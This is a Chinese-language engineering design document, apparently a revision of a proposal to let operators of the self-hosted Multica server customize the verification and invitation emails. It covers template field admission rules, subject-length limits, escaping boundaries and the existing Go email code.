| 4 | `InviteURL` 由 `FRONTEND_ORIGIN` 派生且今天确实渲染 | `:369` 取值 → `:373` `inviteURL := fmt.Sprintf("%s/invite/%s", appURL, invitationID)` → `buildInvitationParams` 里进 `<a href="%s">` | 成立 |

结论与调度 20260826-152000 §1 一致。**这四条是本节全部推理的唯一事实基础**，
下面的取舍不再引入新的代码事实。

#### 0.8.2 两条出路的实际代价

| | 出路一：删 `AppURL`，维持硬规则 | 出路二：留 `AppURL`，撤回/改写「一个字段都不多」 |
|---|---|---|
| 运维方能做的事 | 想在验证码邮件里放 URL，**自己在模板里把 origin 打进去** | 写 `{{.AppURL}}` |
| 授权面 | 与 BASE 严格相同：验证码邮件的模板数据 = 今天已渲染的信息 | **新增**：一个部署级环境变量首次进入凭据类邮件的数据面 |
| 不变量 | 保留一条闭形式性质（INV13，可被反射测试机械验证） | 该性质消失，此后每加一个字段都变成一次个案判断 |
| 可逆性 | 后续想加，加一个字段即可，**向后兼容** | 后续想收回，等于删已发布的模板变量，**破坏运维方已写好的模板** |
| 上游 review | 「验证码模板只能拿到今天已渲染的信息」——一句话结束讨论 | 需要逐字段论证为什么这个环境变量安全——一次开放式讨论 |

#### 0.8.3 裁决与理由

**选出路一。** 决定性的一条是**能力增量为零**：`AppURL` 的值是**部署期常量**，
写模板的人就是配 `FRONTEND_ORIGIN` 的同一个运维方，这个字符串他本来就有。
它与 `Code` 有本质区别——`Code` 是每封信服务端现生成的、写模板时不可能知道的值，
不给就真的做不到；`AppURL` 不给，运维方在自己的模板里敲一行自己的域名即可，**一模一样的效果**。
拿一个「不给也做得到」的便利，去换一条「给了就再也收不回」的封闭性质，不划算。

其余三条支撑：

1. **不对称性**。删了以后要加，是加字段，向后兼容；留了以后要收，是删已发布的模板变量，
   会打断运维方已经写好的模板。在两个方向代价不等的时候，先走可逆的那一边。
2. **凭据类邮件的最小化**。HD-51 正文的三条安全点里有「数据暴露面」一条。验证码邮件是
   本次唯一的凭据类邮件，它今天不含任何 URL；让它首次含有一个部署级环境变量，
   需要一个正当理由，而第 1 段说明这个理由不存在（能力增量为零）。
3. **判据的存活**。「只能包含今天已渲染的信息」之所以值钱，是因为它**可机械执行**
   （§0.8.4 给出算法，T26 给出测试）。撤回它换来的是一个「视情况而定」的口头约定，
   而口头约定在下一轮实现面前和没有一样——PG16 本身就是这么来的。

**放弃了什么，写清楚**：运维方在验证码模板里写绝对链接时，必须自己维护那个 origin；
如果部署换域名，他要改的地方从一处（`FRONTEND_ORIGIN`）变成两处（环境变量 + 模板）。
这是真实代价，不粉饰。判断它可接受的依据是：验证码邮件里本来就不该有链接
（点链接输验证码是钓鱼的标准形态），把这条路做得**略微不顺手**，方向是对的。

**为什么不留 `AppName`**——`AppName` **留**，不在本 finding 范围内：BASE 主题字面量
`Your Multica verification code` 已含品牌名，它满足 §0.8.4 的判据。这一点与调度的划界一致。

#### 0.8.4 硬规则第 3 条重写：单一、可机械执行的判据

原文的缺陷已由调度点明（20260826-152000 §1 末段）：前半句「绝不把……`os.Environ()` 的产物
放进数据结构」按字面读会把 `InviteURL` 也禁掉，而 `InviteURL` 今天确实渲染、本就该允许。
两个半句给出两条不同的判据，实现读到哪句算哪句。**r4 删掉前半句，只留一条：**

> **判据（模板数据字段准入）**：模板 T 的数据结构可以包含字段 F，**当且仅当**存在一个确定性
> 函数 `g`，使得对每一封信，`F` 的值 = `g(该封信在 BASE 上已经产生的 Subject 与 HTML 正文字节)`。
>
> 换句话说：**收信人今天已经能从这封信里读出来的东西，才能进数据结构。**

三点说明，缺一不可：

- **逐封信，不是逐代码库。** 判据的输入是「**这封信**在 BASE 上的输出字节」，不是「仓库里
  某处是否出现过这个值」。`FRONTEND_ORIGIN` 在仓库里当然出现过（`:369`），但它不在
  **验证码那封信**的输出里，所以 `verificationTemplateData.AppURL` 不准入。
- **判据是「能否恢复」，不是「来自哪里」。** 不再问一个值是不是来自 `os.Environ()`。
  `InviteURL` 来自环境变量，但它整个字符串就印在今天的 `<a href>` 里，`g` = 恒等，准入。
- **`g` 必须确定性且不引入外部输入。** 允许截取、拼接、格式化；不允许查库、读环境、读文件。

**这条判据可以机械执行**：拿字段清单去和 BASE 的渲染输出逐个对，写不出 `g` 的当场拒绝。
§7.1.1 给出本次全部字段的 `g`；T26 把「字段集合 = 冻结清单」变成反射测试，
今后任何人加字段都会先看到一条红测试，而不是在评审阶段才被问住。

**这条判据在什么情况下不够用**：当某个字段的值确实是运维方拿不到、且今天也没渲染的
（例如未来要给模板一个 `RequestIP`），判据会拒绝它，而那时可能确实该加。
处置方式是**显式修订判据并说明理由**，不是绕过它——修订留在账本里，绕过不留痕迹。

### 0.9 不只修被点名的那一个：全部模板数据字段与主题模板的逐元素回归（PG17–PG19）

调度 M-L18 把「凡声明封闭性契约，必须逐元素对照 BASE 找落点」升格为核对方的判据。
本节是我对自己执行同一条。**只修 `verificationTemplateData.AppURL` 是不够的**——
PG16 之所以能活到实现开工，正是因为上一轮只核了清单的形式没核元素。

#### 0.9.1 逐字段结果

`verificationTemplateData`（BASE 落点 = `SendVerificationCode`，`email.go:340-364`）：

| 字段 | BASE 落点 | `g` | 判定 |
|---|---|---|---|
| `Code` | `:344` `<p ...>%s</p>` 的实参 | 取正文中该 `<p>` 的内容 | ✅ 准入 |
| `ExpiresInMinutes` | `:345` `This code expires in 10 minutes.` | 从该句取数字 | ✅ 准入（见 PG18） |
| `AppName` | 主题字面量 `Your Multica verification code` | 从主题取品牌词 | ✅ 准入 |
| `AppURL` | **无** | **不存在**（§0.8.1 事实 3） | ❌ **删除**（PG16 裁决） |

`invitationTemplateData`（BASE 落点 = `buildInvitationParams`）：

| 字段 | BASE 落点 | `g` | 判定 |
|---|---|---|---|
| `InviterName` | 主题 `%s invited you to…` + 正文 `<strong>%s</strong>` | 取该 `<strong>` 内容 | ✅ 准入 |
| `WorkspaceName` | 正文 `<h2>You're invited to join %s</h2>` | 取该 `<h2>` 内容 | ✅ 准入 |
| `InviteURL` | 正文 `<a href="%s">` | 恒等 | ✅ 准入 |
| `AppName` | 主题 `… on Multica` | 从主题取品牌词 | ✅ 准入 |
| `AppURL` | 同上 `<a href>`：`{origin}/invite/{id}` | **去掉 `/invite/{id}` 后缀** | ✅ 准入 |

**邀请侧的 `AppURL` 保留**，而且这不是宽严不一：它整体印在今天的 `href` 里，
`g` 是一次确定性的后缀剥离，判据成立。**并且它有实质必要性**——FuncMap 为空（§7.2），
模板自己**无法**从 `InviteURL` 里把 `/invite/{id}` 切掉，不给这个字段，运维方就写不出
「返回首页」一类链接。两侧结论不同，是因为两侧的 BASE 输出不同，判据一条没变。

#### 0.9.2 本次回归新发现的三处

| # | 位置 | 问题 | 裁决 |
|---|---|---|---|
| **PG17** | §7.1 主题模板与正文模板**共用同一个数据结构** | 于是验证码的**主题**模板里可以写 `{{.Code}}`。BASE 主题是字面量，验证码今天**只在正文里**。主题会进 MTA 日志、锁屏预览、推送通知摘要——这是一个**今天不存在的凭据落点**，而且它通过一个纯字段准入判据是合法的（`Code` 有落点） | **允许，但必须显式**。理由：模板由运维方写，与 §7.2 的信任边界一致（能写模板的人本就能把验证码渲染到任何地方）；拆成两个结构体会让「主题里放收件人名」这类正当用法也做不到，代价大于收益。**处置**：T21 文档四语言必须写明「不要把 `{{.Code}}` 放进主题模板：主题会出现在邮件服务器日志与锁屏预览中」；Council L2 新增一条探针核对该警告存在。**判据本身不改**——PG17 说明的是「字段准入」管不住「字段用在哪」，这是两个问题，不能靠同一条规则解决 |
| **PG18** | `ExpiresInMinutes` 的取值 | 它落在 `email.go:345` 的文案 `10 minutes` 上，而**真正的 TTL 在 `handler/auth.go:349`**（`time.Now().Add(10 * time.Minute)`）。两处是**各自独立的字面量**，今天只是碰巧相等。方案若从文案里抄 `"10"`，等于把一个已有的跨文件耦合再复制一份 | **从常量取值，不从文案抄**：`service` 包内定义 `verificationCodeTTL`，`ExpiresInMinutes` 由它格式化得到；新增 **T27** 断言内置模板渲染出的正文包含该常量对应的分钟数。**不修 `auth.go` 与 `email.go` 之间既有的耦合**——那是 BASE 既有缺陷，改它会扩大本次改动面并破坏「未配置时逐字节相同」。T27 只保证本次新增的路径不再引入第三处字面量 |
| **PG19** | §11 L2 `must_answer` 7「DEV 模式下自定义模板是否生效？」 | 这是 **PG16 的同型缺陷第二例**：一个必须在方案阶段拍板的行为选择，被挂成了评审的 `must_answer`（调度 M-L19 已把这类问题列为「方案未完成」）。我在 r3 里写了两次同样的错误，只被抓到一次 | **裁决：DEV 分支在渲染之前返回，行为与 BASE 逐字相同。** `SendVerificationCode` 的 `s.client == nil` 分支只打印 `[DEV] Verification code for %s: %s`，不产生邮件，因此**没有可被模板影响的输出**；让自定义模板在这里生效，唯一后果是把渲染结果（含验证码）带进一个新的日志面，与 INV1 冲突。SMTP 与 Resend 两条**真实发送**路径仍共用同一次渲染，INV8 不受影响。该问题从 `must_answer` 移出，L2 改为核对「DEV 分支的日志输出与 BASE 逐字节相同」这一可证伪探针 |

**PG19 的元教训写进 §13 M20**：`must_answer` 里每一个「是否/要不要」的问句都值得停下来问一句
「这个问题的答案会改变方案吗」。会改变的，就是我该裁决而没裁决的。r3 的 `must_answer`
在本轮被逐条重扫，共 7 条命中（§11 有完整改写对照），PG16 与 PG19 只是其中后果最重的两条。

### 0.10 PG15 处置：删除 `71` 与 `151`，不重建构造

r3 §0.4 与 §5.1 出现的 emoji `71` 与 `mixed 151` 两个数，其构造在 r3 §12 里没有记录，
今天**无法复算**——这与 PG13 是同一类缺陷（只记输出、不记构造）。两条出路：补构造，或删。

**选删。** 理由：这两个数**不承担任何论证负载**。它们出现的位置是「不同字符集下有效长度不同」
这一论断的例证，而该论断已由 §12 探针 G（纯 4 字节 emoji：**67** rune → 994 octet）与
探针 B5（mixed：**198** rune → 998 octet）两条**有完整构造记录**的数据独立支撑。
补一个复算不出来的旧数，不增加任何说服力，只增加一处需要维护的数字。

**连带影响，说清楚**：r3 §12 探针 R2 的 B3 两行引用了 `71` 与 `151` 作为计数。
那两行的**布尔结论**（「emoji 主题可达 998」「混合主题可达 998」）**仍然成立**，
但依据改为探针 G 与 B5，而不是那两个计数。§12 已就地改写（见 §14 变更清单）。

**文档面的硬约束**：T21 的四语言文档中，只允许出现 **91 / 99 / 200 / 67** 四个数，
每一个都在 §8.1 有构造记录、在 §12 探针 R7 有可复现命令。其余数字一律不进用户可见文本。

---

## 1. 需求分层

### 1.1 原始事实（有出处的原文）

| # | 事实 | 出处 |
|---|---|---|
| F1 | 自建实例的对外邮件在 `server/internal/service/email.go` 中是硬编码英文 HTML 字面量，部署方无法替换组织名、语言或视觉 | 父 Issue HD-51 正文「背景」 |
| F2 | 上游 Issue #7569 是我方提交的 feature 请求，当前零评论、无人认领，**方向未定** | 父 Issue「上游状态（必须先读）」 |
| F3 | 维护者取舍偏好三条：既有部署零变更优先；不因新校验让原本能用的部署启动失败（无法解析的值告警放行而非 fail fast）；文档同步四种语言且 `.env.example` 一并更新 | 父 Issue「上游状态」，来源是维护者在姊妹 Issue #7568 的回复 |
| F4 | 交付终点是「方案获得上游认可 + 内部 READY 的候选代码树」，Publication 不在本工程链内 | 父 Issue「交付边界」 |
| F5 | 上游一定会问三个安全点：`html/template` 自动转义是否够、能否被用于伪造发信人、加载失败的降级路径 | 父 Issue「必须处理的安全点」 |
| F6 | ~~方案确定后由发起人在上游补评论征求维护者意见~~ **已取消**——发起人 20260826-112807 更正：上游问询不会发生，U1 在本次交付内保持未验证 | 父 Issue 评论「更正：上游问询不做了」 |
| F7 | 闸门 1 已裁决 Q1–Q4：首版只做验证码+邀请两封邮件的 Subject 与 HTML 正文；不做多语言；主题 200 rune 上限与 `maxSubjectFieldRunes = 60` 语义分离；文档面 11 个文件全做，`docker-compose.selfhost.yml` 是硬需求 | 父 Issue 评论「闸门 1：放行」 |

F3 属于 **Source Contract**，是「明确要求」而非可选参考。本方案的三条硬约束
（INV4 零变更、INV5 降级不 fail、文档四语言）直接由它派生。

### 1.2 仓库约束（读源码读到的，上游没写也不能违反）

| # | 约束 | 依据 |
|---|---|---|
| R1 | 验证码由服务端生成（6 位数字，`return fmt.Sprintf("%06d", n)`），`SendVerificationCode` 的注释明确写「no user-controlled text reaches the email body here」 | `handler/auth.go:114-121`（生成）、`email.go:337-339`（注释）。**r3 补出生成点的行号**——r2 只引了注释却断言「6 位数字」 |
| R2 | 主题行中的用户可控文本必须经 `sanitizeSubjectField`：剥离控制字符 + 60 rune 截断 | `email.go:21-24`、`:413-434`、`:394-395` |
| R3 | 邮件正文中的 `workspaceName` / `inviterName` 必须经 `html.EscapeString` | `email.go:392-393` |
| R4 | Subject 不做 HTML 转义是**刻意**的——注释写明转义会把 `&lt;script&gt;` 字面量泄进收件箱 | `email.go:413-416` |
| R5 | 发信人身份由 `resolveFromEmail` 从 `SMTP_FROM_EMAIL` / `RESEND_FROM_EMAIL` 决定，是部署配置而非请求数据 | `email.go:114-126`、`:309`、`:319`、`:357`、`:398` |
| R6 | 配置解析失败的既有处置范式是「告警 + 回退」，不是 fail fast，且告警一律 `fmt.Printf` 到 **stdout** | `email.go:218-220`、`:199-206` |
| R7 | `docker-compose.selfhost.yml` 对 backend 容器**逐个枚举**环境变量，不是 `env_file` 透传 | `docker-compose.selfhost.yml:64-80` |
| R8 | Helm chart 走 `envFrom` 引用 Secret，不枚举单个变量 | `deploy/helm/multica/templates/backend.yaml:66` |
| **R9（r3 订正，PG12）** | 仓库已有 `embed.FS` 用法。`server/` 下**没有任何 `html/template` 的用法**（生产与测试均无），这是本次首次引入；但 **`text/template` 已有一处生产用法**：`server/cmd/multica/help.go:6` 用它渲染 CLI 帮助文本（另有 `cmd_daemon_test.go:15` 在测试中）。~~r2 写「两者都没有」，错~~ | `builtin_skills.go:11`；`grep -rn '"text/template"\|"html/template"' server --include=*.go` |
| R10 | 邀请邮件在**独立 goroutine** 中 fire-and-forget 发送，验证码邮件在请求 goroutine 上同步发送——两者会并发执行 | `invitation.go:239-243`、`auth.go:356` |
| R11 | 后端容器无 `USER`、无 `read_only`、无 `readOnlyRootFilesystem`，`WORKDIR /app`，已有 `backend_uploads:/app/data/uploads` 卷 | `Dockerfile:30`、`docker-compose.selfhost.yml:62-63` |
| **R12** | **`NewEmailService` 无条件打印一行通道选择日志**（SMTP relay / Resend API / DEV mode 三选一） | `email.go:227-238`（→ PG7）。**行号范围必须从 `227` 的 `switch {` 起、到 `238` 的 `}` 止**——「无条件」这个性质由三分支穷尽（含 `default`）保证，从分支内部的 `229` 起引会丢掉论证本身（§0.6，r3 未采纳把它改成 `:229-238` 的建议） |
| **R13** | **`sendSMTP` 的 header 块含两个时变字段**：`Date:`（`time.Now().UTC()`）与 `Message-ID:`（`time.Now().UnixNano()`） | `email.go:319-327`（→ PG5） |
| **R14** | **BASE 的 mock relay 不广播 8BITMIME**，EHLO 应答只有 `250-test-smtp Hello` / 可选 STARTTLS / 可选 AUTH / `250 OK`；因此 `has8Bit` 恒为 false，测试里正文**必走 quoted-printable** | `email_test.go:570-577`（**r3 订正，r2 写 `:562-578`**）、`email.go:296-307`（→ PG4） |
| **R15** | **BASE 的 mock relay 的 DATA 读取是丢弃式**（`for { dataLine := readLine(); if dataLine == "." { break } }`），既不保存内容也不做 dot-unstuffing | `email_test.go:616-624`（→ PG4） |

### 1.3 合理推导

- **D1**：F3 的「字节级零变更」若靠「改完再写测试证明没变」来保证，每次重构都要重新证明一遍。
  应当让它成为**结构性质**——未配置时根本不进入新代码路径。这条决定了整个方案的形态（§6 方案 A）。
- **D2**：F5 的「自动转义是否足够」隐含了「模板文本本身是否可信」。自动转义保护的是
  **注入模板的数据**，不保护**模板文本**。真正的答案不在转义机制上，而在**谁有权写模板**这条边界上（§7）。
- **D3**：由 D2 推出，三条路径的差别不只是改动面大小。环境变量与挂载目录把授权点放在**部署运维方**；
  DB + 管理界面把授权点放在**租户内的管理员**。后者是一次真实的信任边界下移（§6 方案 C）。
- **D4**：由 R7 推出，任何新增的 `EMAIL_TEMPLATE_*` 变量若不同步写进 `docker-compose.selfhost.yml`，
  用官方 compose 的自建用户**根本没法设置它**。文档面因此是 11 个文件而非 5 个（已由 F7/Q4 裁决确认）。
- **D5**：由 R8 推出，Helm 不需要改。
- **D6（新）**：由 R13/R14/R15 推出，**mock relay 抓到的 DATA 不是「邮件内容」，是「邮件内容
  在特定传输编码下的一种表示」。** 任何拿它做逐字节断言的验收项，都必须先说明它做的是哪一层
  的比较：wire 层（含 QP、含 dot-stuffing、含时变 header）还是内容层（解码后）。r1 没有区分，
  PG4/PG5/PG9 三处都是这个混淆的产物。

### 1.4 我的假设（最该被挑战的部分）

| # | 假设 | 默认取值 | 假设错了会怎样 |
|---|---|---|---|
| A1 | 上游会接受「运维方通过文件系统提供模板」这个形态，而不是坚持要 DB + UI | 按方案 A 推进 | 整个推荐作废，需重写为方案 C。**本方案最大的单点风险，且 U1 在本次交付内不可验**（F6 更正后） |
| A2 | 第一版不需要多语言选择机制 | 目录布局预留 `<name>.<lang>.tmpl` 命名空间但**不实现**语言选择 | 需引入「收件人语言从哪来」这个当前不存在的概念。已由 Q2 裁决确认不做 |
| A3 | 模板在启动时加载一次即可，不需要热重载 | 启动时解析，改模板需重启容器 | 若要热重载，需引入 per-send 磁盘 I/O 与 TOCTOU 面 |
| A4 | 渲染后主题的长度上限可以与 `maxSubjectFieldRunes` 分离 | 逐字段仍 60 rune；整条渲染后主题另设 200 rune 上限。**r2 补充：外加 998 octet 硬上限**（PG3/INV11） | 若沿用 60 rune，稍长的自定义主题会被莫名截断。已由 Q3 裁决确认 200 rune |
| A5 | 首版只做「验证码」与「邀请」两封邮件的 Subject + HTML 正文 | 见 §1.5 | 已由 Q1 裁决确认 |
| A6 | 上游 PR #7577 尚未合入，我方改动会与它文本冲突 | 见 §10 冲突预案 | **本轮已复算，仍未合入**（§0.3 / §12 探针 U） |
| **A7（新）** | **998 octet 的 `Subject:` 行上限对自定义主题是可接受的产品行为** | 超限时继续按 rune 截断，不回落内置 | 若运维方认为「我写的主题被砍了」是 bug，需要改为「超限则回落内置 + 告警」或提高上限并接受 RFC 违规。**作为 Q5 交闸门 1**（§2） |

### 1.5 不做什么（non-goals）

1. **不做 DB 存储与管理界面**——理由见 §6 方案 C，是信任边界问题不是工作量问题。
2. **不做按收件人语言选模板**（A2）。
3. **不做模板热重载**（A3）。
4. **不让模板控制 `From` / `Reply-To` / `To` / `Bcc` / 任意 header。** `resend.SendEmailRequest`
   确实有 `ReplyTo` / `Bcc` / `Headers` 字段（SDK v2.28.0 已核对），所以这条边界必须写明而不是默认。
5. **不做纯文本（`text/plain`）备选正文。** 当前 `Content-Type` 固定 `text/html`（`email.go:325`）。
6. **不改内置模板的任何一个字节。** 本次只加「配置了才走」的旁路。
7. **不动 Helm chart**（D5/R8）。
8. **不引入任何自定义模板函数（FuncMap）。** 见 §7.1。
9. **（新）不做模板 parse tree 的静态字段校验。** 理由见 §0.2——它是给模板语言子集写类型检查器，
   且 fail closed 时的伤害与零值预执行的假阳性同类。
10. **（新）不修复内置邀请主题在极端 CJK 输入下超出 998 octet 的既有问题。** 实测今天两个
    60-rune CJK 字段就能产出 **1349 octet** 的 `Subject:` 行（§12 探针 B），已超 RFC 5322 上限。
    这是 BASE 既有行为，修它必然改内置路径、破坏 INV4 的零 diff 证据。**r2 只保证新路径不加剧**
    （INV11），并把既有问题作为独立的上游 Issue 候选记录在 §9。

---

## 2. 与发起人的讨论轮次（HIGH_RISK）

Q1–Q4 已由闸门 1 全部裁决（F7），**不重新提问**。

| 轮次 | 问题 | 发起人的决定 | 对方案的影响 |
|---|---|---|---|
| 1 | Q1 首版范围 | 接受：只做验证码 + 邀请两封邮件的 Subject 与 HTML 正文 | A5 确认，§1.5 non-goal 1/2/5 成立 |
| 1 | Q2 多语言 | 首版不做 | A2 确认 |
| 1 | Q3 主题长度 | 200 rune，与 `maxSubjectFieldRunes = 60` 逐字段语义分离 | A4 确认，INV3 保持 |
| 1 | Q4 文档面 | 扩到 11 个文件，`docker-compose.selfhost.yml` 属硬需求 | P18–P22 全部纳入 |
| 1 | A1 上游取向 | 上游问询取消，U1 在本次交付内保持 `UNVERIFIED`，随交付交出 | §9 可证伪条件 1 从「即将被检验」变为「随交付交出的开放风险」 |

**本轮新增一个确认项**，因为 PG3 的处置**改变了 Q3 裁决的实际效果**——发起人裁决的是
「200 rune」，而实测在 CJK 主题上真正先触顶的是 octet 上限（**91 rune**）。这属于「已有明确
推荐、只需一句确认或否决」的确认项，不是开放式讨论，**不阻塞**。

**（r3 改写，PG10）** r2 把它写成一问：「上限值取多少」。这个问法**预设了「要有这条上限」
已经成立**，而方案自己在 §9 可证伪条件 10 与 §11 L3 `must_answer` 6 里正在质疑这个前提
（U7 未验证）。把一个写在自己可证伪清单里的前提，在唯一的确认项里当成已定，不诚实。
r3 拆成 Q5a / Q5b，两问都给推荐，发起人可以只回「都按推荐」一句话结束：

```
❓ Q5a — 渲染后主题要不要加这条 998 octet 的 `Subject:` 整行硬上限？

   为什么这是个真问题（而不是走过场）：
     - RFC 5322 §2.1.1 规定单行 ≤ 998 octet，这是标准。
     - 但 **U7 未验证**：真实 MTA 对超长 `Subject:` 行到底是拒信、改写还是静默放行，
       我没有对任何真实 relay 做过实验，只读了 RFC。
     - 而**反证是现成的**：今天的内置邀请主题，在两个 60-rune CJK 字段下就产出
       1349 octet 的 `Subject:` 行（§12 探针 R5），已经违规，且从未有人报障。
       这至少说明「违规 ⇒ 出事」不是必然。
     - 代价是实的：加了它，纯中日韩主题的有效长度从 200 字降到 **91 字**
       （纯 ASCII 主题 200 字完全不受影响，§0.4 有分字符集的表）。而这个功能的
       目标用户，正是想用自己语言发信的自建方。

➡️ 推荐：加。理由是**不对称**——不加而 MTA 严格，后果是收件人收不到邮件，且故障现场
   在我方观测不到的第三方跳上，排查成本极高；加了而 MTA 宽松，后果是主题被截断，
   可见、可解释、可在文档里预告。在 U7 未验证的前提下，选可观测的那种失败。
   另一条独立理由：这条上限**只作用于新增的自定义路径**，内置路径一字不改
   （non-goal 10），所以它不会让任何既有部署的行为发生变化。

   若否决（不加）：INV11、T23、T24a、T24b 整条删除，§7.1 主题防线退回两步（剥控制字符 →
   200 rune），§9 可证伪条件 10 与 L3 must_answer 6 随之失效。这是一次干净的删除，
   不留半截状态。


❓ Q5b — 若 Q5a 为「加」：上限取 998，超限时**继续按 rune 截断**（而非回落内置）。可否？

   背景（实测，§12 探针 R1/R5，口径 = len("Subject: " + QEncoding.Encode("utf-8", s))，
   不含 CRLF）：
     - 200 个 CJK rune → `Subject:` 行 2185 octet，超限 1.2 倍。
     - 998 之下：纯中日韩 91 rune（996 octet）；带空格的中日韩 99；纯 4 字节 emoji 67；
       纯 ASCII 200 rune 只有 209 octet，完全不触碰这条规则。
     - `QEncoding` **不折行**（`splitWord` 写空格不写 CRLF，`encodedword.go:173-178`），
       所以超长就是一条超长行，不是合法折行 header。

➡️ 推荐：可否。
   - 取 **998**（RFC 5322）而非 1000（RFC 5321 §4.5.3.1.6，含 CRLF）：998 更保守，
     且两者只差 2 octet，取严的那个不增加实际代价。
   - 取**截断**而非**回落内置**：主题过长是**内容问题不是失败**，回落会让运维方的品牌名
     整封消失，代价远大于被截断。
   - 截断按 **rune** 而非 octet，保证不在多字节字符中间切断。

   若否决 Q5b 但同意 Q5a，替代是：超限则该封邮件主题回落内置并告警。
   我不推荐——它把一个内容问题升格成失败，且与 INV5 的「降级只在渲染失败时发生」混为一谈。

📄 无论 Q5a/Q5b 怎么裁，文档面（T21）都要按**分字符集**写，不能写一个孤零零的数字：
   「纯中日韩主题约 91 字；含空格与 ASCII 时更长；纯 ASCII 主题 200 字不受影响」。
   r2 要求文档写「约 80 字」，那既是错值（PG10），也是错的表达形态。
```

其余待决项无。PG1、PG2 的裁决按角色分工属于规划自身职责（卡片明示「这是你的裁决」），
已在 §0.1 / §0.2 给出理由与代价；PG10、PG11 同理，见 §0.4 / §0.5。
四处裁决随闸门 1 一并呈交发起人复核，但不作为提问。

### 2.3 闸门 1 的答复（20260826-150500，已裁决，本文不重开）

| 项 | 发起人裁决 | 落点 |
|---|---|---|
| `Q1`–`Q4` | 维持 r3 原裁决 | 原文各节不变 |
| `Q5a`（998 octet 上限） | **加** | INV11、T23、T24a/T24b 保留 |
| `Q5b`（超限按 rune 截断） | **可否** | §7.1 主题防线三步保留 |
| 「纯中日韩主题 200→91 字」这一用户可见约束 | **必须写进四语言文档** | T21（§8） |
| 路线 A、`PG1`、`PG2` | 维持，不重开 | §0.1 / §0.2 / §6 |
| 追加约束一（PR 描述主动交代两条路径 998 处理不一致） | 新增 | 实现的 `coder/<ts>-publication-notes.md`，§14 点明责任 |
| 追加约束二（folding 是正解 / 本次截断是范围内取舍 / folding 同时能修内置 1349 越界） | 新增 | **本文 §5.2**（r4 新增一节） |
| `PG15` | 非阻塞，文档面只许用 91 / 99 / 200 / 67 | §0.10、§8 T21 |

### 2.4 r4 是否需要新一轮追问：**无需追问**

判据是方法正本的那条——「发起人能答，且答案会改变方案」。本轮逐条过：

- **PG16** 是本轮唯一的未决方向选择，发起人确实能答，答案确实会改变方案。
  但**它已经被安排在一道人工闸门上**：调度 20260826-152000 §4 已定，r4 冻结并经核对后
  会再走一次**只呈 PG16** 的人工闸门 1。此时另起一轮追问，是把同一个问题、向同一个人、
  提前一轮问一遍，多消耗一次往返而不改变任何信息量。
  **并且我有明确推荐**（§0.8，出路一，理由与代价齐备），按正本「确认项」的形态，
  发起人一句「按推荐」即可结束。所以：把 PG16 留给闸门，不另起追问轮。
- **PG17 / PG18 / PG19** 都在我的裁量权内（模板文档措辞、常量取值来源、DEV 分支行为），
  且三处的推荐都不扩大授权面、不改变已放行方向，不构成需要发起人权衡的取向问题。
- **PG15** 是纯复算问题，事实自己查即可，§0.10 已处置。
- 其余需要事实的地方（`FRONTEND_ORIGIN` 落点、TTL 字面量、`QEncoding` 折行行为）
  全部是能从源码或标准库读到的，按正本「事实自己查」执行，结论已作为前提写在各节。

**这条判断在什么情况下是错的**：如果发起人对 PG16 的偏好不是二选一，而是第三条路
（例如「验证码模板整体不支持自定义」或「给 `AppURL` 但加白名单校验」），那么把问题留到闸门
就晚了——闸门只做批或不批。我认为这个风险低：HD-51 正文已确定两封信都要支持自定义，
第三条路会推翻更上游的范围。但这是**假设，不是事实**，据此列入 §9 可证伪条件 15。

---

## 3. 当前行为（改动前的真实情况）

### 3.1 构造与通道选择

`NewEmailService()`（`email.go:177-251`）在进程启动时被 `server/cmd/server/router.go:370` 调用一次，
结果作为单例注入 `handler.Handler.EmailService`（`handler.go:200`、`:461`）。

通道优先级（`email.go:227-238` 的日志与 `:349`/`:375` 的分支共同决定）：

1. `SMTP_HOST` 非空 → SMTP relay 通道（`sendSMTP`）
2. 否则 `RESEND_API_KEY` 非空 → Resend API 通道（`s.client.Emails.Send`）
3. 否则 → DEV 模式，验证码 `fmt.Printf` 到 stdout（`:353`）

**三条分支各自打印恰好一行 `EmailService: …`（R12）。这是无条件的**——任何「启动后恰好一行
日志」的断言都必须把它算进去（PG7）。

### 3.2 两封邮件的构造

**验证码**（`SendVerificationCode`，`:340-364`）：正文由一个 `fmt.Sprintf` 拼出 5 行内联 HTML
（`:341-347`），`code` 以 `%s` 原样插入（R1）。主题是**字面量** `"Your Multica verification code"`，
在 `:350`（SMTP）与 `:359`（Resend）**各写一次**。同一个 `body` 变量供两条通道共用。

**邀请**（`SendInvitationEmail`，`:368-386` → `buildInvitationParams`，`:391-411`）：
`buildInvitationParams` 是**包级函数、无 receiver**，注释明确说这样拆是为了让 sanitization 行为
可以脱离 Resend SDK 与 SMTP server 做单元测试（`:388-390`）。它做四件事：
`html.EscapeString(workspaceName)` / `html.EscapeString(inviterName)` 给正文，
`sanitizeSubjectField(...)` 给主题，然后 `fmt.Sprintf` 拼出主题（`:400`）与正文（`:401-409`）。
`inviteURL` 由 `FRONTEND_ORIGIN`（缺省 `https://multica.ai`）加 `/invite/{invitationID}` 拼成，
**以 `%s` 原样插入 `href`，不经任何转义**。

### 3.3 转义边界（今天到底防住了什么）——r2 已按实测改写

| 面 | 机制 | 位置 | 实际效果（本轮实测） |
|---|---|---|---|
| 正文中的用户名 / 工作区名 | `html.EscapeString` | `:392-393` | 转义 `<>&'"` |
| 主题中的用户名 / 工作区名 | `sanitizeSubjectField` | `:419-434` | 剥离 `unicode.IsControl` 字符（**含 TAB**）；超过 60 rune 截断为 59 rune + `…` |
| 主题落到 SMTP 线上 | `mime.QEncoding.Encode` | `:292` | **CR/LF/DEL/VT 触发编码**（`"Hi\r\n…"` → `"=?utf-8?q?Hi=0D=0A…?="`）；**但 TAB 被 `needsEncoding` 显式豁免，原样穿过**（`encodedword.go:44`）。纯 ASCII 可打印串原样返回，不编码。**不折行**——超长时产出一条超长行（`splitWord` 写空格，`encodedword.go:173-178`） |
| 正文落到 SMTP 线上 | 先 QP（无 8BITMIME 时）再 `textproto.DotWriter` | `:296-307`、`smtp.go:296` | QP：`=`→`=3D`，76 列软换行 `=\r\n`。DotWriter：插入前导点、`\n`→`\r\n`、Close 补 `.\r\n`。正文中的 `.` 行**不能**提前终止 DATA |
| 主题落到 Resend | **无本地编码** | `:359`/`:400` | 依赖 Resend 侧过滤，现有注释即如此声明（`:416-418`）。**这是 PG1 选项 1 的决定性依据之一** |
| `To:` / `From:` header | **无编码** | `:319-320` | `to` 来自收件人地址，`from` 来自部署配置（R5）。既有面，本次不改 |
| `Date:` / `Message-ID:` header | `time.Now()` | `:322-323` | **每次不同**（R13），任何「逐字节比对已知期望串」必须先掩蔽这两行 |

